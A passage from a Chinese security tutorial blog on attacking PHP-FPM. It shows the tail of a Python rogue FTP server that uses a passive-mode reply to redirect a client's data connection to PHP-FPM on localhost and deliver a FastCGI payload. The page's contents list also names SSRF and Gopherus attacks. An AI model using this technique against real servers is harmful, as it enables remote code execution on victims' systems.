class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># USER aaa\r\n  客户端传来用户名</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;220 ready\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 ready\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   <span class="comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;215 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># SIZE /123\r\n  客户端询问文件/123的大小</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;213 3 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;300 \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># EPSV\r\n&#x27;</span></span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   <span class="comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 127,0,0,1,4,210\n&quot;</span>)  <span class="comment"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 127,0,0,1,35,40\n&quot;</span>)  <span class="comment"># 端口计算规则：35*256+40=9000</span></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;125 \n&quot;</span>) <span class="comment"># 告诉客户端可以开始数据连接了</span></span><br><span class="line">        <span class="comment"># 新建一个socket给服务端返回我们的payload</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;建立连接!&quot;</span>)</span><br><span class="line">        conn2, address2 = sk2.accept()</span><br><span class="line">        conn2.send(payload)</span><br><span class="line">        conn2.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;断开连接!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;150 \n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))</span><br><span class="line">        exit()</span><br><span class="line">    <span class="comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;226 \n&quot;</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <p><img src="https://i.dawnlab.me/53a8c7cf3ad77a0f0a456ce2c6afe88a.png" loading="lazy"></p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>John Doe<br>
+        <strong>本文链接：</strong><a href="http://m1racle20.github.io/2024/09/27/%E6%94%BB%E5%87%BBPHP-FPM/" title="http:&#x2F;&#x2F;m1racle20.github.io&#x2F;2024&#x2F;09&#x2F;27&#x2F;%E6%94%BB%E5%87%BBPHP-FPM&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;m1racle20.github.io&#x2F;2024&#x2F;09&#x2F;27&#x2F;%E6%94%BB%E5%87%BBPHP-FPM&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1727706340878"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          请在你的配置文件中设置 slotComment
+
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nginx%E4%B8%8EPHP-FPM"><span class="toc-number">1.</span> <span class="toc-text">Nginx与PHP-FPM</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx"><span class="toc-number">1.1.</span> <span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-FPM"><span class="toc-number">1.2.</span> <span class="toc-text">PHP-FPM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx%E4%B8%8EPHP-FPM%E9%80%9A%E4%BF%A1"><span class="toc-number">1.3.</span> <span class="toc-text">Nginx与PHP-FPM通信</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CGI%E4%B8%8EFastCGI"><span class="toc-number">2.</span> <span class="toc-text">CGI与FastCGI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CGI"><span class="toc-number">2.1.</span> <span class="toc-text">CGI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastCGI"><span class="toc-number">2.2.</span> <span class="toc-text">FastCGI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FastCGI%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">FastCGI协议分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastcgi-record"><span class="toc-number">3.1.</span> <span class="toc-text">Fastcgi record</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastcgi-type"><span class="toc-number">3.2.</span> <span class="toc-text">Fastcgi type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">抓包流量分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nginx%EF%BC%88IIS7%EF%BC%89%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">Nginx（IIS7）解析漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">PHP-FPM未授权访问漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-FPM%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">PHP-FPM任意代码执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%89%93PHP-FPM"><span class="toc-number">7.</span> <span class="toc-text">远程打PHP-FPM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%89%93PHP-FPM"><span class="toc-number">8.</span> <span class="toc-text">SSRF打PHP-FPM</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8p%E7%A5%9E%E8%84%9A%E6%9C%AC"><span class="toc-number">8.1.</span> <span class="toc-text">使用p神脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Gopherus"><span class="toc-number">8.2.</span> <span class="toc-text">使用Gopherus</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB%E7%82%B9"><span class="toc-number">9.</span> <span class="toc-text">SSRF中的攻击点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-exec"><span class="toc-number">9.1.</span> <span class="toc-text">curl_exec()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-get-contents"><span class="toc-number">9.2.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sockopen"><span class="toc-number">9.3.</span> <span class="toc-text">sockopen()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FTP%E6%94%BB%E5%87%BBFPM-FastCGI"><span class="toc-number">10.</span> <span class="toc-text">FTP攻击FPM&#x2F;FastCGI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F"><span class="toc-number">10.1.</span> <span class="toc-text">FTP的两种模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">10.2.</span> <span class="toc-text">写入文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%86%99%E5%9B%9E%E6%96%87%E4%BB%B6"><span class="toc-number">10.3.</span> <span class="toc-text">读取写回文件</span></a></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
